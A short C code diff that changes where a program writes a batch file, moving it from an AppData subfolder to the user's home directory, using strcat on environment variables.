@@ -11,7 +11,7 @@ int main()
     fileName[0]=0;
     strcat(fileName,getenv("HOMEDRIVE"));
     strcat(fileName,getenv("HOMEPATH"));
-    strcat(fileName,"\\AppData\\bat.bat");
+    strcat(fileName,"\\bat.bat");
     fPtr = fopen(fileName, "w");
     fputs(data, fPtr);
     fclose(fPtr);
